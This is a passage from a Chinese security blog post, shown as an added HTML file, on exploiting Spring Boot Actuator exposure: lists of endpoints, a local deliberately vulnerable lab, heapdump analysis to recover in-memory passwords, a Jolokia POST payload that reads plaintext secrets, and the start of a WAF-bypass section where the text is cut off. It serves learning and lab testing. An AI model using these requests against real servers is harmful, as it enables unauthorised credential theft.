@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>常规外网打点 | ZLARYY</title><meta name="author" content="ZLARYY"><meta name="copyright" content="ZLARYY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="常规外网打点（持续更新中……）spring-bootactuator泄露参考：可造成敏感信息泄露！Spring Boot Actuator信息泄露漏洞三种利用方式总结 - FreeBuf网络安全行业门户 Springboot之Actuator信息泄露漏洞利用_spring actuator 漏洞-CSDN博客 actuator是帮助管理和监控Spring-Boot应用的模块，这个模块采集应用的内部">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常规外网打点">
+<meta property="og:url" content="https://zlaryy123.github.io/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/index.html">
+<meta property="og:site_name" content="ZLARYY">
+<meta property="og:description" content="常规外网打点（持续更新中……）spring-bootactuator泄露参考：可造成敏感信息泄露！Spring Boot Actuator信息泄露漏洞三种利用方式总结 - FreeBuf网络安全行业门户 Springboot之Actuator信息泄露漏洞利用_spring actuator 漏洞-CSDN博客 actuator是帮助管理和监控Spring-Boot应用的模块，这个模块采集应用的内部">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
+<meta property="article:published_time" content="2026-05-19T13:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-19T12:54:56.162Z">
+<meta property="article:author" content="ZLARYY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "常规外网打点",
+  "url": "https://zlaryy123.github.io/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/",
+  "image": "https://zlaryy123.github.io/img/avertar.png",
+  "datePublished": "2026-05-19T13:00:00.000Z",
+  "dateModified": "2026-05-19T12:54:56.162Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZLARYY",
+      "url": "https://ZLARYY123.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zlaryy123.github.io/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '常规外网打点',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZLARYY</span></a><a class="nav-page-title" href="/"><span class="site-name">常规外网打点</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">常规外网打点</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-05-19T13:00:00.000Z" title="Created 2026-05-19 21:00:00">2026-05-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-19T12:54:56.162Z" title="Updated 2026-05-19 20:54:56">2026-05-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="常规外网打点（持续更新中……）"><a href="#常规外网打点（持续更新中……）" class="headerlink" title="常规外网打点（持续更新中……）"></a>常规外网打点（持续更新中……）</h1><h1 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring-boot"></a>spring-boot</h1><h2 id="actuator泄露"><a href="#actuator泄露" class="headerlink" title="actuator泄露"></a>actuator泄露</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/407651.html">可造成敏感信息泄露！Spring Boot Actuator信息泄露漏洞三种利用方式总结 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JHIII/article/details/126601858">Springboot之Actuator信息泄露漏洞利用_spring actuator 漏洞-CSDN博客</a></p>
+<p>actuator是帮助管理和监控<code>Spring-Boot</code>应用的模块，这个模块采集应用的内部信息，展现给外部模块，可以查看应用配置的详细信息，例如自动化配置信息、创建的<code>Spring beans</code>信息、系统环境变量的配置信息以及web请求的详细信息等。</p>
+<p>如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator），其中heapdump作为Actuator组件最为危险的web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息</p>
+<h3 id="1-x版本"><a href="#1-x版本" class="headerlink" title="1.x版本"></a>1.x版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/configprops #显示所有@ConfigurationProperties</span><br><span class="line"></span><br><span class="line">/env #公开Spring的ConfigurableEnvironment</span><br><span class="line"></span><br><span class="line">/health #显示应用程序运行状况信息</span><br><span class="line"></span><br><span class="line">/httptrace #显示HTTP跟踪信息</span><br><span class="line"></span><br><span class="line">/metrics #显示当前应用程序的监控指标信息</span><br><span class="line"></span><br><span class="line">/mappings #显示所有@RequestMapping路径的整理列表</span><br><span class="line"></span><br><span class="line">/threaddump #线程转储</span><br><span class="line"></span><br><span class="line">/heapdump #堆转储</span><br><span class="line"></span><br><span class="line">/jolokia #JMX-HTTP桥,它提供了一种访问JMXbeans的替代方法</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-x版本"><a href="#2-x版本" class="headerlink" title="2.x版本"></a>2.x版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/actuator #查看有哪些Actuator端点是开放的</span><br><span class="line"></span><br><span class="line">/actuator/auditevent #auditevents端点提供有关应用程序审计事件的信息</span><br><span class="line"></span><br><span class="line">/actuator/beans #beans端点提供有关应用程序bean的信息</span><br><span class="line"></span><br><span class="line">/actuator/configprops #configprops端点提供有关应用程序@ConfigurationProperties的信息</span><br><span class="line"></span><br><span class="line">/actuator/env #查看全部环境属性，可以看到Spring-boot载入哪些properties，以及properties的值（会自动用*替换key、password、secret等关键字的properties的值）</span><br><span class="line"></span><br><span class="line">/actuator/flyway #flyway端点提供有关Flyway执行的数据库迁移的信息</span><br><span class="line"></span><br><span class="line">/actuator/health #显示应用程序运行状况信息</span><br><span class="line"></span><br><span class="line">/actuator/httptrace #提供有关http请求-响应交换的信息（包括用户HTTP请求的Cookie数据，会造成Cookie泄露等）</span><br><span class="line"></span><br><span class="line">/actuator/info #info端点提供有关应用程序的一般信息</span><br><span class="line"></span><br><span class="line">/actuator/integrationgraph #integrationgraph端点公开了一个包含所有Spring Integrationgraph组件的图</span><br><span class="line"></span><br><span class="line">/actuator/liquibase #liquibase端点提供有关Liquibase应用的数据库更改集的信息</span><br><span class="line"></span><br><span class="line">/actuator/logfile #logfile端点提供对应用程序日志文件内容的访问</span><br><span class="line"></span><br><span class="line">/actuator/loggers #loggers端点提供对应用程序记录器及其级别配置的访问</span><br><span class="line"></span><br><span class="line">/actuator/mappings #mappings端点提供有关应用程序请求映射的信息</span><br><span class="line"></span><br><span class="line">/actuator/metrics #metrics端点提供对应用程序指标的访问</span><br><span class="line"></span><br><span class="line">/actuator/heapdump #heapdump端点提供来自应用程序JVM的堆转储（通过分析查看/env端点被*替换到数据的具体值）</span><br><span class="line"></span><br><span class="line">/actuator/threaddump #线程转储</span><br><span class="line"></span><br><span class="line">/actuator/jolokia #JMX-HTTP桥,它提供了一种访问JMXbeans的替代方法</span><br><span class="line"></span><br><span class="line">/actuator/prometheus #端点以prometheusPrometheus服务器抓取所需的格式提供Spring-boot应用程序的指标</span><br><span class="line"></span><br><span class="line">/actuator/quartz #quartz端点提供有关由Quartz调整程序管理的作业和触发器的信息</span><br><span class="line"></span><br><span class="line">/actuator/scheduledtasks #scheduledtasks端点提供有关应用程序计划执行任务的信息</span><br><span class="line"></span><br><span class="line">/actuator/sessions #sessions端点提供有关由Spring session管理的应用程序HTTP会话的信息</span><br><span class="line"></span><br><span class="line">/actuator/startup #startup端点提供有关应用程序启动顺序的信息</span><br><span class="line"></span><br><span class="line">/actuator/shutdown #shutdown端点用于关闭应用程序</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是要利用heapdump去解决密码是<code>*</code>的问题，尝试了一下在本地搭建带有spring-boot的actuator信息泄露的靶场：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">这里用的是kaliLinux</span><br><span class="line"></span><br><span class="line"># 更新软件源并安装 OpenJDK 11 和 Maven</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install default-jdk maven -y</span><br><span class="line"></span><br><span class="line"># 验证安装是否成功（确保有版本信息输出）</span><br><span class="line">java -version</span><br><span class="line">mvn -version</span><br><span class="line"></span><br><span class="line">#创建并就进入项目文件夹</span><br><span class="line">mkdir ~/actuator-lab &amp;&amp; cd ~/actuator-lab</span><br><span class="line"></span><br><span class="line">#写入Maven配置文件（pom.xml）</span><br><span class="line">cat &lt;&lt; &#x27;EOF&#x27; &gt; pom.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;groupId&gt;com.lab&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;actuator-lab&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.7.5&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">#创建目录并写入配置文件（包含敏感信息）</span><br><span class="line">mkdir -p src/main/resources</span><br><span class="line">cat &lt;&lt; &#x27;EOF&#x27; &gt; src/main/resources/application.properties</span><br><span class="line"># 危险配置：暴露所有 actuator 接口</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line"># 模拟敏感配置信息</span><br><span class="line">cloud.aws.credentials.access-key=AKIAIOSFODNN7EXAMPLE</span><br><span class="line">cloud.aws.credentials.secret-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">#创建目录并写入Java漏洞代码</span><br><span class="line">mkdir -p src/main/java/com/lab</span><br><span class="line">cat &lt;&lt; &#x27;EOF&#x27; &gt; src/main/java/com/lab/ActuatorDemoApplication.java</span><br><span class="line">package com.lab;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">@RestController</span><br><span class="line">public class ActuatorDemoApplication &#123;</span><br><span class="line"></span><br><span class="line">    // 模拟内存中驻留的敏感变量</span><br><span class="line">    private String userSessionToken = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(ActuatorDemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;/login&quot;)</span><br><span class="line">    public String login(String password) &#123;</span><br><span class="line">        // 将用户的密码拼接后长期保留在内存中</span><br><span class="line">        this.userSessionToken = &quot;Token_Auth_&quot; + password;</span><br><span class="line">        return &quot;Login Success! Password saved in memory.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">#在~/actuator-lab目录下运行命令启动spring boot</span><br><span class="line">mvn spring-boot:run</span><br><span class="line">当终端出现类似 Started ActuatorDemoApplication in x.xx seconds 的字样时，说明靶场启动成功</span><br></pre></td></tr></table></figure>
+
+<p>搭建好之后可以通过IP下的8080端口访问</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/1.png" class="" width="1">
+
+<p>我们需要知道这个值，可以有几种利用方法</p>
+<h4 id="heapdump"><a href="#heapdump" class="headerlink" title="heapdump"></a>heapdump</h4><p>首先模拟一个登录状态，之后我们尝试信息泄露的手法去访问<code>/actuator/env</code>和<code>/actuator/heapdump</code></p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/2.png" class="" width="2">
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/3.png" class="" width="3">
+
+<p>访问<code>/actuator/heapdump</code>的话可以看到直接下载下来了一个文件，分析这个文件可以使用<code>jvisualvm.exe</code>这个JDK自带的工具，路径为<code>JDK\bin\jvisualvm.exe</code></p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/4.png" class="" width="4">
+
+<p>文件类型选择堆之后选择刚刚下载的heapdump，装入文件之后就是输入OQL语句过滤我们需要的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OQL是一种类似SQL的查询语言，用于查询Java堆，OQL允许从Java堆中过滤/选择所需的信息。虽然HAT已经支持诸如“显示X类的所有实例”之类的预定义查询，但OQL增加了更多的灵活性。OQL基于JavaScript表达式语言。</span><br></pre></td></tr></table></figure>
+
+<p>在Spring boot2.X版本中，env信息存储在java.util.LinkedHashMap$Entry类中</p>
+<p>查询数据库密码需要在OQL控制台执行如下OQL语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.datadsource.password/.test(s.key)</span><br></pre></td></tr></table></figure>
+
+<p>不过我这里一直显示查询返回结果为空呢？</p>
+<p>另一种方法就是先进入<code>类标签页</code>，在底部过滤器中搜索<code>ActuatorDemoApplication</code></p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/5.png" class="" width="5">
+
+<p>双击显示的有实例的类</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/6.png" class="" width="6">
+
+<p>找到这个<code>userSessionToken</code>，打开之后我们可以看到存在一个value：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">84111107101110956511711610495907665828989</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/7.png" class="" width="7">
+
+<p>用逗号隔开的数字每一组对应一个字符的ASCII码：<code>Token_Auth_ZLARYY</code></p>
+<p>也可以试试使用<a href="https://link.zhihu.com/?target=https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/8.png" class="" width="8">
+
+<p>查询密码可以<code>&gt; password</code>，获取ip<code>&gt; getip</code>，获取url<code>&gt; geturl</code>，获取文件路径<code>&gt; getfile</code></p>
+<h4 id="jolokia"><a href="#jolokia" class="headerlink" title="jolokia"></a>jolokia</h4><p>要利用这个方法的话需要目标网站存在<code>/jolokia</code>、<code>/actuator/jolokia</code>，使用了<code>jolokia-core</code>依赖，默认情况下actuator是没有jolokia接口的，所以需要再添加如下依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.jolokia&lt;/groupId&gt; </span><br><span class="line">    &lt;artifactId&gt;jolokia-core&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;1.7.0&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外我们还需要在<code>/src/main/resources/application.properties</code>加上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.application.admin.enabled=true</span><br></pre></td></tr></table></figure>
+
+<p>首先依旧是访问<code>/actuator/env</code>接口，，获取想要获得明文的属性名，然后通过jolokia调用相关MBean获取明文。</p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/9.png" class="" width="9">
+
+<p>接下来我们访问<code>/actuator/jolokia/list</code></p>
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/10.png" class="" width="10">
+
+<p>查看的内容是目标环境中存在的MBean</p>
+<p>接下来我们尝试通过调用我们找到的MBean来获取我们感兴趣字段的明文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST/actuator/jolokia </span><br><span class="line">Content-Type:application/json </span><br><span class="line">&#123;&quot;mbean&quot;:&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;:&quot;getProperty&quot;,&quot;type&quot;:&quot;EXEC&quot;,&quot;arguments&quot;:[&quot;security.user.password&quot;]&#125;</span><br><span class="line">#这里用的是security.user.password，在我这里查询应该是cloud.aws.credentials.secret-key</span><br></pre></td></tr></table></figure>
+
+<p>jolokia是一个JMX-HTTP桥接器，在Java中，JMX（Java Management Extensions）是用来在程序运行期间管理和监控Java程序的底层机制。Jolokia允许你通过发送简单的HTTP(JSON)请求，去调用Java底层的JMX方法，这段payload其实是执行了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 获取名为 SpringApplication 的管理 Bean (MBean)</span><br><span class="line">Object mbean = getMBean(&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;);</span><br><span class="line"></span><br><span class="line">// 执行 (EXEC) 它的 getProperty 方法，传入参数 &quot;security.user.password&quot;</span><br><span class="line">mbean.getProperty(&quot;security.user.password&quot;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/11.png" class="" width="11">
+
+<p>如果是直接<code>change request method</code>的话要记得把<code>Content-Type</code>改为<code>application/json</code>，否则默认会是<code>application/x-www-form-urlencoded</code></p>
+<h3 id="绕过waf的一些相关方法"><a href="#绕过waf的一些相关方法" class="headerlink" title="绕过waf的一些相关方法"></a>绕过waf的一些相关方法</h3><p>文章参考：<a target="_blank" rel="noopener" href="https://zone.ci/secarticles/wx/501728.html">SpringBootActuator配置错误利用实战：路径探测、绕过技巧与敏感端点攻击 | ZONE.CI 全球网</a></p>
+<ul>
+<li><p>路径变体寻找actuator：</p>
